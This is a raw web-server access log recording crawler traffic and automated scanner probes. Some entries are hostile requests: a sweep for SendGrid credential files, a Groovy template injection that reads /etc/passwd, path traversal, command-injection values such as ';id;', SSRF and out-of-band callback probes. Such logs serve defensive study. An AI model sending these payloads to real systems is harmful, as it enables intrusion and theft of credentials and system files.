114.119.138.117 - - [27/Apr/2025:02:01:37 -0400] "GET /index.php/Detail/occurrences/114 HTTP/1.1" 499 0 "https://35.239.124.218/index.php/Detail/occurrences/114" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
154.83.103.107 - - [30/Apr/2025:03:18:57 -0400] "GET /wp-content/plugins/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:57 -0400] "GET /modules/contrib/sendgrid_mail/sendgrid_mail.module HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:57 -0400] "GET /modules/contrib/sendgrid_mail/sendgrid_mail.settings.php HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:57 -0400] "GET /modules/contrib/sendgrid_mail/sendgrid_mail.services.yml HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:57 -0400] "GET /modules/contrib/sendgrid_mail/translations/sendgrid_mail.fr.po HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:57 -0400] "GET /wp-content/themes/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:57 -0400] "GET /wp-content/uploads/wp-mail-smtp/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:57 -0400] "GET /wp-content/backup/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:58 -0400] "GET /wp-includes/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:58 -0400] "GET /wp-content/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:58 -0400] "GET /wp-admin/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:58 -0400] "GET /sendgrid_keys HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:58 -0400] "GET /.sendgrid/credentials HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:58 -0400] "GET /.sendgrid/config HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:58 -0400] "GET /config/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:58 -0400] "GET /config/sendgrid_config.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:59 -0400] "GET /private/sendgrid_keys HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:59 -0400] "GET /private/sendgrid_config HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:59 -0400] "GET /backup/sendgrid_keys HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:59 -0400] "GET /backup/sendgrid_config HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:59 -0400] "GET /secrets/sendgrid_keys HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:59 -0400] "GET /secrets/sendgrid_config HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:59 -0400] "GET /config/sendgrid.py HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:59 -0400] "GET /settings/sendgrid_keys HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:18:59 -0400] "GET /settings/sendgrid_config HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /config/settings/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /config/settings/sendgrid_config.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /config/env/sendgrid.env HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /config/env/sendgrid_keys.env HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /instance/sendgrid_keys.py HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /sendgrid_keys.txt HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /sendgrid_keys.py HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /keys/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /api_keys/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:00 -0400] "GET /config/packages/sendgrid.yaml HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:01 -0400] "GET /config/secrets/prod/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:01 -0400] "GET /config/secrets/dev/sendgrid_keys.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:01 -0400] "GET /config/sendgrid.php HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:01 -0400] "GET /storage/sendgrid.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:01 -0400] "GET /backup/sendgrid.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:01 -0400] "GET /secrets/sendgrid.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:01 -0400] "GET /config/sendgrid.js HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.107 - - [30/Apr/2025:03:19:01 -0400] "GET /private/sendgrid.json HTTP/1.1" 404 286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.81.156.35 - - [30/Apr/2025:03:22:05 -0400] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.16.160 - - [30/Apr/2025:03:30:49 -0400] "GET /ab2g HTTP/1.1" 404 276 "-" "Mozilla/5.0 zgrab/0.x"
139.59.16.160 - - [30/Apr/2025:03:30:50 -0400] "GET /ab2h HTTP/1.1" 404 276 "-" "Mozilla/5.0 zgrab/0.x"
139.59.16.160 - - [30/Apr/2025:03:30:51 -0400] "GET /alive.php HTTP/1.1" 404 276 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
139.59.16.160 - - [30/Apr/2025:03:30:57 -0400] "GET / HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
139.59.16.160 - - [30/Apr/2025:03:31:07 -0400] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
139.59.16.160 - - [30/Apr/2025:03:31:08 -0400] "GET /t4 HTTP/1.1" 400 248 "-" "Mozilla/5.0"
139.59.16.160 - - [30/Apr/2025:03:31:09 -0400] "GET /t4 HTTP/1.1" 404 276 "-" "Mozilla/5.0"
139.59.16.160 - - [30/Apr/2025:03:31:09 -0400] "GET /favicon.ico HTTP/1.1" 400 650 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
139.59.16.160 - - [30/Apr/2025:03:31:10 -0400] "GET /favicon.ico HTTP/1.1" 404 276 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
154.81.156.54 - - [30/Apr/2025:03:31:17 -0400] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.16.160 - - [30/Apr/2025:03:31:20 -0400] "GET / HTTP/1.1" 499 0 "-" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 10.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
139.59.16.160 - - [30/Apr/2025:03:31:21 -0400] "GET /teorema505?t=1 HTTP/1.1" 404 276 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
35.187.65.14 - - [30/Apr/2025:03:38:13 -0400] "GET / HTTP/1.1" 499 0 "-" "python-requests/2.32.3"
66.249.73.97 - - [30/Apr/2025:04:01:20 -0400] "GET /robots.txt HTTP/1.1" 200 128 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.99 - - [30/Apr/2025:04:02:50 -0400] "GET /index.php/Browse/objects/view/map/key/a065cad40ac08b98277129550f621064/sort/Title/_advanced/0 HTTP/1.1" 200 140 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.95 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
183.29.197.133 - - [30/Apr/2025:04:05:32 -0400] "GET / HTTP/1.1" 301 162 "-" "Hello-World/1.0"
183.29.197.133 - - [30/Apr/2025:04:05:32 -0400] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
185.218.86.4 - - [30/Apr/2025:04:06:35 -0400] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
114.119.142.94 - - [30/Apr/2025:04:09:21 -0400] "GET /index.php/Detail/objects/97 HTTP/1.1" 499 0 "https://35.239.124.218/index.php/Detail/objects/97" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
154.81.156.54 - - [30/Apr/2025:04:16:50 -0400] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.249.73.99 - - [30/Apr/2025:04:16:59 -0400] "GET /index.php/Detail/objects/2271 HTTP/1.1" 200 140 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.114 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.203.211.40 - - [30/Apr/2025:04:21:39 -0400] "GET / HTTP/1.1" 301 162 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
35.203.211.40 - - [30/Apr/2025:04:21:49 -0400] "GET / HTTP/1.1" 499 0 "http://35.239.124.218:80/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
176.65.128.199 - - [30/Apr/2025:04:26:06 -0400] "GET /backup.zip HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:07 -0400] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD6\x93\xCB\xE5\xB8\xD5\xA1\xB5\x0049\x9EoO{\x86vg" 400 150 "-" "-"
176.65.128.199 - - [30/Apr/2025:04:26:07 -0400] "GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:07 -0400] "GET /bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:07 -0400] "GET /api/v1/markdown/link:metadata?link=http://localhost:13042 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:08 -0400] "POST /index.php/display/status_zigbee HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:08 -0400] "POST /wp-admin/admin-ajax.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:08 -0400] "GET /goanywhere/images/..;/wizard/InitialAccountSetup.xhtml HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:08 -0400] "GET /file=http://oast.pro HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:09 -0400] "GET /filex/read-raw?url=http://oast.me&cut=1 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:09 -0400] "POST /task/submit/ HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - cslu-windows-client [30/Apr/2025:04:26:09 -0400] "GET /cslu/v1/scheduler/jobs HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - ';ls;' [30/Apr/2025:04:26:09 -0400] "GET /access/set?param=enableapi&value=1 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:09 -0400] "GET /cslu/v1/var/logs/customer-cslu-lib-log.log HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:10 -0400] "GET /render/info.html HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - helpdeskIntegrationUser [30/Apr/2025:04:26:10 -0400] "GET /classes/common/busiFacade.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:10 -0400] "POST /clients/MyCRL HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:10 -0400] "GET /Admin/Admin.aspx HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:11 -0400] "GET /?p=3232&wp_automatic=download&link=file:///etc/passwd HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:11 -0400] "GET /system/config_menu.htm HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:11 -0400] "GET /device/config HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:11 -0400] "GET /interview?i=/etc/passwd HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:12 -0400] "GET /file=/etc/passwd HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:12 -0400] "GET /file=c:%5Cwindows%5Cwin.ini HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:12 -0400] "GET /php/ztp_gate.php/.js.map HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:12 -0400] "POST /classes/common/busiFacade.php HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:12 -0400] "GET /cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:13 -0400] "GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
176.65.128.199 - - [30/Apr/2025:04:26:13 -0400] "GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 150 "-" "-"
